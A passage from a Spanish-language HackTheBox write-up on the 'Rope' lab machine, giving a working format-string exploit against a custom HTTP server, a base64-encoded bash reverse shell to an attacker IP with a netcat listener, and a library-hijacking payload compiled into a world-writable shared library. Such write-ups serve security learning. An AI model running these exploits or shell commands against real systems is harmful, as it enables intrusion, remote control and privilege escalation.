<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">:</span><span class="mtk6">%d</span><span class="mtk4"> </span><span class="mtk6">%d</span><span class="mtk4"> - "</span><span class="mtk1">, pcVar3, (</span><span class="mtk7 mtki">uint</span><span class="mtk1">) uVar2,param_1);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(param_3);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"request method:"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(param_3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk3">// ...

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Entonces, si <code>puts</code> es <code>system</code>, podemos ejecutar lo que queramos siempre que nuestro comando est茅 en <code>param_3 + 0x400</code>. Por el momento, vamos a comenzar a escribir el <em>exploit</em> en Python:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'httpserver'</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">url_encode</span><span class="mtk1">(</span><span class="mtk9 mtki">url</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'%'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">'%'</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">byte</span><span class="mtk1">)[</span><span class="mtk6">2</span><span class="mtk1">:] </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">byte</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk9 mtki">url</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">()</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">fmtstr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">%96c</span><span class="mtk4">%56$hhn-</span><span class="mtk6">\x48\xa0\x55\x56%30c</span><span class="mtk4">%60$hhn-</span><span class="mtk6">\x49\xa0\x55\x56%88c</span><span class="mtk4">%64$hhn-</span><span class="mtk6">\x4a\xa0\x55\x56%18c</span><span class="mtk4">%68$hhn-</span><span class="mtk6">\x4b\xa0\x55\x56</span><span class="mtk4">'</span>  

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">url_encode</span><span class="mtk1">(</span><span class="mtk1">fmtstr</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">http</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk4">'127.0.0.1'</span><span class="mtk1">, </span><span class="mtk6">9999</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">http</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'GET /'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">' HTTP/1.1</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">http</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>He deshabilitado ASLR para realizar pruebas. Una vez que el binario est谩 en ejecuci贸n (fuera de GDB), podemos lanzar el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">fmtstr_exploit.py</span>
[<span class="code-blue">*</span>] './httpserver'
    Arch:     i386-32-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9999: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9999
</code></pre></div><p>Como esper谩bamos, aparecen alg煤nos errores de <code>sh</code> (comandos no encontrados):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./httpserver</span>
listen on port 9999, fd is 3
accept request, fd is 4, pid is 261035
sh: 1: request: not found
Usage: GET [-options] &lt;url&gt;...
    -m &lt;method&gt;   use method for the request (default is 'GET')
    -f            make request even if GET believes method is illegal
    -b &lt;base&gt;     Use the specified URL as base
    -t &lt;timeout&gt;  Set timeout value
    -i &lt;time&gt;     Set the If-Modified-Since header on the request
    -c &lt;conttype&gt; use this content-type for POST, PUT, CHECKIN
    -a            Use text mode for content I/O
    -p &lt;proxyurl&gt; use this as a proxy
    -P            don't load proxy settings from environment
    -H &lt;header&gt;   send this HTTP header (you can specify several)
    -C &lt;username&gt;:&lt;password&gt;
                  provide credentials for basic authentication

    -u            Display method and URL before any response
    -U            Display request headers (implies -u)
    -s            Display response status code
    -S            Display response status chain (implies -u)
    -e            Display response headers (implies -s)
    -E            Display whole chain of headers (implies -S and -U)
    -d            Do not display content
    -o &lt;format&gt;   Process HTML content in various ways

    -v            Show program version
    -h            Print this message
127.0.0.1:34438 404 -                                                                                                -HUV                             -IUV                                                                                       -JUV                 X-KUV  
</code></pre></div><p>Pero hay uno interesante. De hecho, <code>GET</code> es un comando, y su panel de ayuda se muestra cuando se ejecuta sin argumentos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">GET</span>
Usage: GET [-options] &lt;url&gt;...
    -m &lt;method&gt;   use method for the request (default is 'GET')
    -f            make request even if GET believes method is illegal
    -b &lt;base&gt;     Use the specified URL as base
    -t &lt;timeout&gt;  Set timeout value
    -i &lt;time&gt;     Set the If-Modified-Since header on the request  
    -c &lt;conttype&gt; use this content-type for POST, PUT, CHECKIN
    -a            Use text mode for content I/O
    -p &lt;proxyurl&gt; use this as a proxy
    -P            don't load proxy settings from environment
    -H &lt;header&gt;   send this HTTP header (you can specify several)
    -C &lt;username&gt;:&lt;password&gt;
                  provide credentials for basic authentication

    -u            Display method and URL before any response
    -U            Display request headers (implies -u)
    -s            Display response status code
    -S            Display response status chain (implies -u)
    -e            Display response headers (implies -s)
    -E            Display whole chain of headers (implies -S and -U)
    -d            Do not display content
    -o &lt;format&gt;   Process HTML content in various ways

    -v            Show program version
    -h            Print this message
</code></pre></div><h3 id="obteniento-rce">Obteniento RCE</h3><p>Si modificamos el <em>exploit</em> cambiando <code>GET</code> por <code>whoami</code>, veremos la ejecuci贸n de <code>whoami</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sed</span> -i s/GET/whoami/g <span class="mtku">fmtstr_exploit.py</span>

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">fmtstr_exploit.py</span>
[<span class="code-blue">*</span>] './httpserver'
    Arch:     i386-32-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9999: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9999
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./httpserver</span>
listen on port 9999, fd is 3
accept request, fd is 4, pid is 263141
sh: 1: request: not found
rocky
127.0.0.1:34440 404 -                                                                                                -HUV                             -IUV                                                                                       -JUV                 X-KUV  
</code></pre></div><p>Chulo, 驴no? Entonces <code>param_3 + 0x400</code> apunta exactamente al m茅todo de petici贸n HTTP. Podemos verificarlo en el c贸digo fuente descompilado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">parse_request</span><span class="mtk1">(undefined4 </span><span class="mtk9 mtki">param_1</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_2</span><span class="mtk1">) {</span>
<span class="mtk3">  // ...</span>

<span class="mtk1">  local_10 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined4 </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">800</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined4 </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">804</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk8">rio_readinitb</span><span class="mtk1">(local_101c, param_1);</span>
<span class="mtk1">  </span><span class="mtk8">rio_readlineb</span><span class="mtk1">(local_101c, </span><span class="mtk5">&amp;</span><span class="mtk1">local_c10, </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_sscanf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">local_c10, </span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4"> </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, local_810, </span><span class="mtk5">&amp;</span><span class="mtk1">local_410);</span>  

<span class="mtk3">  // ...</span>

<span class="mtk1">  </span><span class="mtk8">strcpy</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (param_2 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">), local_810);</span>
<span class="mtk1">  </span><span class="mtk8">url_decode</span><span class="mtk1">(local_1028, param_2, </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (local_10 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_GS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">)) {</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail_local</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Aqu铆 aparece <code>sscanf</code> (<code>__isoc99_sscanf</code>) para parsear la l铆nea de petici贸n, dividi茅ndola por espacios en blanco, de manera que la primera parte (el m茅todo HTTP) va a <code>local_810</code>. Y luego, se copia en <code>param_2 + 0x400</code>. Esta variable <code>param_2</code> en <code>parse_request</code> es la misma que <code>param_3</code> en <code>log_access</code>.</p><p>Entonces tenemos una manera de ejecutar comandos explotando la vulnerabilidad de <em>Format String</em>. Pero hay otro problema: no podemos usar espacios en el comando. De acuerdo con <a href="https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces">unix.stackexchange.com</a>, es posible usar la variable de entorno <code>${IFS}</code> para eso. Vamos a probar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sed</span> -i s/whoami/echo\${IFS}asdf/g <span class="mtku">fmtstr_exploit.py</span>

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">fmtstr_exploit.py</span>
[<span class="code-blue">*</span>] './httpserver'
    Arch:     i386-32-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9999: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9999
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./httpserver</span>
listen on port 9999, fd is 3
accept request, fd is 4, pid is 335175
sh: 1: request: not found
asdf
127.0.0.1:34442 404 -                                                                                                -HUV                             -IUV                                                                                       -JUV                 X-KUV  
</code></pre></div><p>Genial, ya va siendo hora de explotar el servidor remoto. Recordemos que ten铆amos informaci贸n 煤til en <code>/proc/self/maps</code> (la direcci贸n base del binario es <code>0x565ab000</code> y la direcci贸n base de Glibc es <code>0xf7dad000</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/maps -H <span class="code-dark-yellow">'Range: bytes=0-1000000'</span>
565ab000-565ac000 r--p 00000000 08:02 46784                              /opt/www/httpserver  
565ac000-565ae000 r-xp 00001000 08:02 46784                              /opt/www/httpserver
565ae000-565af000 r--p 00003000 08:02 46784                              /opt/www/httpserver
565af000-565b0000 r--p 00003000 08:02 46784                              /opt/www/httpserver
565b0000-565b1000 rw-p 00004000 08:02 46784                              /opt/www/httpserver
57c42000-57c64000 rw-p 00000000 00:00 0                                  [heap]
f7dad000-f7f7f000 r-xp 00000000 08:02 46904                              /lib32/libc-2.27.so
f7f7f000-f7f80000 ---p 001d2000 08:02 46904                              /lib32/libc-2.27.so
f7f80000-f7f82000 r--p 001d2000 08:02 46904                              /lib32/libc-2.27.so
f7f82000-f7f83000 rw-p 001d4000 08:02 46904                              /lib32/libc-2.27.so
f7f83000-f7f86000 rw-p 00000000 00:00 0
f7f8f000-f7f91000 rw-p 00000000 00:00 0
f7f91000-f7f94000 r--p 00000000 00:00 0                                  [vvar]
f7f94000-f7f96000 r-xp 00000000 00:00 0                                  [vdso]
f7f96000-f7fbc000 r-xp 00000000 08:02 46900                              /lib32/ld-2.27.so
f7fbc000-f7fbd000 r--p 00025000 08:02 46900                              /lib32/ld-2.27.so
f7fbd000-f7fbe000 rw-p 00026000 08:02 46900                              /lib32/ld-2.27.so
ffea8000-ffec9000 rw-p 00000000 00:00 0                                  [stack]
curl: (18) transfer closed with 998488 bytes remaining to read
</code></pre></div><p>Vamos a descargar la librer铆a Glibc remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.10.148:9999//lib32/libc-2.27.so

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">libc-2.27.so</span>
libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=63b3d43ad45e1b0f601848c65b067f9e9b40528b, for GNU/Linux 3.2.0, stripped  
</code></pre></div><p>Una vez que hemos entendido c贸mo funciona un <em>exploit</em> de <em>Format String</em>, podemos automatizar todo con <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>. Veremos que es extremadamente f谩cil:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"Usage: python3 </span><span class="mtk6">{</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span><span class="mtk6">}</span><span class="mtk4"> '&lt;command&gt;'"</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">, </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_base_addresses</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address  : </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">command</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">replace</span><span class="mtk1">(</span><span class="mtk4">' '</span><span class="mtk1">, </span><span class="mtk4">'$</span><span class="mtk6">{IFS}</span><span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">url_encode</span><span class="mtk1">(</span><span class="mtk8">fmtstr_payload</span><span class="mtk1">(</span><span class="mtk6">53</span><span class="mtk1">, {</span>
<span class="mtk1">        </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.puts: </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system</span>
<span class="mtk1">    }))</span>

<span class="mtk1">    </span><span class="mtk1">http</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk6">9999</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">http</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk1">command</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">' /'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">' HTTP/1.1</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">http</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aqu铆: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Rope/fmtstr_exploit.py"><code>fmtstr_exploit.py</code></a>.</p><p>Ahora podemos conseguir una <em>reverse shell</em> en la m谩quina usando <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">fmtstr_exploit.py</span> <span class="code-dark-yellow">'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span>  
[<span class="code-blue">*</span>] './httpserver'
    Arch:     i386-32-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 10.10.10.148 on port 9999: Done
[<span class="code-blue">*</span>] Closed connection to 10.10.10.148 port 9999
[<span class="code-green">+</span>] ELF base address  : 0x5657c000
[<span class="code-green">+</span>] Glibc base address: 0xf7d7a000
[<span class="code-green">+</span>] Opening connection to 10.10.10.148 on port 9999: Done
[<span class="code-blue">*</span>] Closed connection to 10.10.10.148 port 9999
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.148 43178
bash: cannot set terminal process group (1193): Inappropriate ioctl for device  
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
john@rope:/opt/www$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash: /root/.bashrc: Permission denied
john@rope:/opt/www$ ^Z
zsh: suspended  nc -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  nc -nlvp 4444
                               reset xterm
john@rope:/opt/www$ export TERM=xterm
john@rope:/opt/www$ export SHELL=bash
john@rope:/opt/www$ stty rows 50 columns 158
</code></pre></div><p>Perfecto, tenemos ejecuci贸n remota de comandos (RCE) como <code>john</code>.</p><h2 id="movimiento-lateral-al-usuario-r4j">Movimiento lateral al usuario <code>r4j</code></h2><p>La enumeraci贸n b谩sica nos dice que <code>john</code> puede ejecutar <code>/usr/bin/readlogs</code> como <code>r4j</code> usando <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">john@rope:/opt/www$ sudo -l
Matching Defaults entries for john on rope:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on rope:
    (r4j) NOPASSWD: /usr/bin/readlogs
john@rope:/opt/www$ file /usr/bin/readlogs
/usr/bin/readlogs: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, B  
uildID[sha1]=67bdf14148530fcc5c26260c3450077442e89f66, not stripped
</code></pre></div><p>Se trata de un binario ELF. Si lo ejecutamos, vemos una ristra de mensajes de <em>log</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">john@rope:/opt/www$ sudo -u r4j /usr/bin/readlogs
Jul 19 21:00:01 rope CRON[1726]: pam_unix(cron:session): session opened for user root by (uid=0)
Jul 19 21:00:01 rope CRON[1726]: pam_unix(cron:session): session closed for user root
Jul 19 21:02:01 rope CRON[1731]: pam_unix(cron:session): session opened for user root by (uid=0)
Jul 19 21:02:01 rope CRON[1731]: pam_unix(cron:session): session closed for user root
Jul 19 21:04:01 rope CRON[1785]: pam_unix(cron:session): session opened for user root by (uid=0)
Jul 19 21:04:01 rope CRON[1785]: pam_unix(cron:session): session closed for user root
Jul 19 21:06:01 rope CRON[1808]: pam_unix(cron:session): session opened for user root by (uid=0)
Jul 19 21:06:01 rope CRON[1808]: pam_unix(cron:session): session closed for user root
Jul 19 21:06:08 rope sudo:     john : TTY=pts/0 ; PWD=/opt/www ; USER=r4j ; COMMAND=/usr/bin/readlogs  
Jul 19 21:06:08 rope sudo: pam_unix(sudo:session): session opened for user r4j by (uid=0)
</code></pre></div><p>Nada interesante, la verdad. Si miramos a las librer铆as compartidas que usa el binario, tenemos estas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">john@rope:/opt/www$ ldd /usr/bin/readlogs
        linux-vdso.so.1 (0x00007ffd4f3e0000)
        liblog.so => /lib/x86_64-linux-gnu/liblog.so (0x00007fc8e6732000)  
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc8e5f28000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc8e651b000)
</code></pre></div><p>Mir谩ndolas una a una, vemos que <code>liblog.so</code> es modificable por cualquier usuario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">john@rope:/opt/www$ ls -l /lib/x86_64-linux-gnu/liblog.so
-rwxrwxrwx 1 root root 15984 Jun 19  2019 /lib/x86_64-linux-gnu/liblog.so  
</code></pre></div><h3 id="ataque-de-_library-hijacking_">Ataque de <em>Library Hijacking</em></h3><p>Por tanto, podemos hacer un ataque de <em>Library Hijacking</em> e inyectar comandos maliciosos en la librer铆a compartida, de manera que estos comandos se ejecuten como <code>r4j</code>. Para comenzar, podemos crear este programa en C y compilarlo como librar铆a compartida:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">john@rope:/opt/www$ cd /tmp
john@rope:/tmp$ vim lib.c
john@rope:/tmp$ cat lib.c
#include &lt;unistd.h&gt;

void _init() {
    char *argv[] = {"/bin/sh", 0};
    execve(argv[0], &argv[0], NULL);
}
john@rope:/tmp$ gcc -shared -fpic lib.c -o /lib/x86_64-linux-gnu/liblog.so  
